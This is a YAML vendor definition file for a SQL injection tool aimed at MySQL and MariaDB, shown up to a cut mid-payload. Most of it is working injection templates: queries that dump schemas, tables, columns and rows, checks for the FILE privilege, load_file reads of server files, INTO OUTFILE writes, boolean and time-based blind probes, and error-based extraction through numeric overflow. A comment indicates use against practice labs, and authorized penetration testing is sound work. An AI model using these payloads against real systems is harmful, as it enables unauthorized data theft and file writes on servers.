vendor: MySQL

resource:
 info: |
   concat(
       concat_ws(
           ${enclose_value_hex},
           version(),
           database(),
           user()
       ),
       ${trail_hex}
   )

 schema:
  database: |
   select concat(
       ifnull(
           group_concat(
               ${enclose_value_hex},
               r,
               ${separator_qte_hex},
               q,
               ${enclose_value_hex}
               order by r
               separator ${separator_cell_hex}
           ),
           ${trail_hex}
       ),
       ${trail_hex}
   ) from (
       select
           cast(SCHEMA_NAME as char) r,
           cast(count(TABLE_NAME) as char) q
       from INFORMATION_SCHEMA.tables
       right join INFORMATION_SCHEMA.schemata
       on SCHEMA_NAME = table_schema
       group by r
       /* Required by Error Extractvalue */
       order by 1
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           r,
           ${separator_qte_hex},
           q,
           ${enclose_value_hex}
           order by r
           separator ${separator_cell_hex}
       ),
       ${trail_hex}
   ) from (
       select
           cast(TABLE_NAME as char) r,
           cast(ifnull(table_rows, 0x30) as char) q
       from information_schema.tables
       where TABLE_SCHEMA = 0x${database.hex}
       /* Required by Error Extractvalue */
       order by 1
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           n,
           ${separator_qte_hex},
           0,
           ${enclose_value_hex}
           order by n
           separator ${separator_cell_hex}
       ),
       ${trail_hex}
   ) from (
       select cast(COLUMN_NAME as char) n
       from information_schema.columns
       where TABLE_SCHEMA = 0x${database.hex}
       and TABLE_NAME = 0x${table.hex}
       /* Required by Error Extractvalue */
       order by 1
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            ${enclose_value_hex},
            r,
            ${separator_qte_hex},
            q,
            ${enclose_value_hex}
            order by r
            separator ${separator_cell_hex}
        ),
        ${trail_hex}
    ) from (
        select
            cast(concat(${fields}) as char) r,
            cast(count(*) as char) q
        from `${database}`.`${table}`
        group by r
        /* Required by Error Extractvalue */
        order by 1
        ${limit}
    ) x
   fields:
    field: trim(ifnull(`${field.value}`, 0x20))
    concat: ",0x7f,"

 zip:
  database: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           SCHEMA_NAME,
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ),
       '${trail_sql}'
   )
   from INFORMATION_SCHEMA.schemata
   ${limit}

  table: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           TABLE_NAME,
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ),
       '${trail_sql}'
   )
   from information_schema.tables
   where TABLE_SCHEMA = '${database}'
   ${limit}

  column: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           COLUMN_NAME,
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ),
       '${trail_sql}'
   )
   from information_schema.columns
   where TABLE_SCHEMA = '${database}'
   and TABLE_NAME = '${table}'
   ${limit}

  row:
   query: |
    select concat(
        group_concat(
            ${enclose_value_hex},
            concat(${fields}),
            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ),
        '${trail_sql}'
    )
    from ${database}.${table}
    ${limit}
   fields:
    field: "${field.value}"
    concat: ",0x7f,"

 dios:
  database: |
   select concat(@a:=0,(select count(*) from (
       select concat(
           ${enclose_value_hex},
           cast(SCHEMA_NAME as char),
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ) a
       from INFORMATION_SCHEMA.schemata
   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')

  table: |
   select concat(@a:=0,(select count(*) from (
       select concat(
           ${enclose_value_hex},
           cast(TABLE_NAME as char),
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ) a
       from information_schema.tables
       where TABLE_SCHEMA = 0x${database.hex}
   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')

  column: |
   select concat(@a:=0,(select count(*) from (
       select concat(
           ${enclose_value_hex},
           cast(COLUMN_NAME as char),
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ) a
       from information_schema.columns
       where TABLE_SCHEMA = 0x${database.hex}
       and TABLE_NAME = 0x${table.hex}
   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')

  row:
   query: |
          select concat(@a:=0,(select count(*) from (
              select concat(
                  ${enclose_value_hex},
                  cast(concat(${fields}) as char),
                  '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
              ) a
              from `${database}`.`${table}`
          )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
   fields:
    field: trim(ifnull(`${field.value}`, 0x20))
    concat: ",0x7f,"

 file:
  privilege: |
   cast(
       concat(
           (
               select if(count(*) = 1, 0x74727565, 0x66616c7365)
               from INFORMATION_SCHEMA.USER_PRIVILEGES
               where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
               and PRIVILEGE_TYPE = 0x46494c45
           ),
           ${trail_hex}
       )
       as char
   )
  read: cast(concat(load_file(0x${filepath.hex}), ${trail_hex}) as char)
  create:
   content: (select 0x${content.hex})
   query: into outfile "${filepath}"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           concat(
               ${lead_hex},
               mid(
                   (${injection}),
                   ${window.char},
                   ${capacity}
               )
           )
   )
  limit: limit ${limit.value}, 65536
  failsafe: 1337${indice}7330%2b1
  calibrator: repeat(${calibrator_hex}, 65536)
  limitBoundary: 0
  # Encoded space mandatory to avoid space cleaning
  # pentesterlab does not work with --+-, switch to # %23
  endingComment: --+-
  fingerprint:
   errorMessage:
    # Spring
    - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.*' at line \\d+
    - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '.*' at line \\d+
    - Unknown column '.*' in 'where clause'
    # Other
    - MySQL
    - MariaDB
   orderByErrorMessage:
    - Unknown column '1337' in 'order clause'

 normal:
  indices: union select ${indices}
  capacity: |
   (
       select concat(
           ${lead_hex},
           ${indice},
           ${calibrator}
       )
   )
  orderBy: order by 1337

 boolean:
  test:
   bit: |
    ascii(
        substring(
            ${injection},
            ${window.char},
            1
        )
    )
    %26 ${bit}
   length: char_length(${injection}) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}
  time: |
   ${boolean.mode} if(
       ${test},
       1,
       sleep(${sleep_time})
   )

 error:
  method:
  
   - name: Unsigned:or
     query: |
      /* Data truncation: BIGINT UNSIGNED value is out of range in '<sqli>' */
      or !(
          select *
          from (
              ${window}
          ) x
      )-~0
     capacity: 453
     
   - name: Unsigned:and
     query: |
      and !(
          select *
          from (
              ${window}
          ) x
      )-~0
     capacity: 453

   - name: Unsigned:order by
     query: |
      1, (
          select 1
          from (
              select !(
                  select *
                  from (
                      ${window}
                  ) x
              )-~0
          ) x
      )
     capacity: 453

   - name: Unsigned:or Crud
     query: |
      ' or (
          select !(
              select *
              from (
                  ${window}
              ) x
          )-~0
      ) or '
     capacity: 453

   - name: Unsigned:and Crud
     query: |
      ' and (
          select !(
              select *
              from (
                  ${window}
              ) x
          )-~0
      ) or '
     capacity: 453

   - name: OverDouble:or
     query: |
      /* Data truncation: DOUBLE value is out of range in '<sqli>' */
      or 1 = exp(
          ~(
              select *
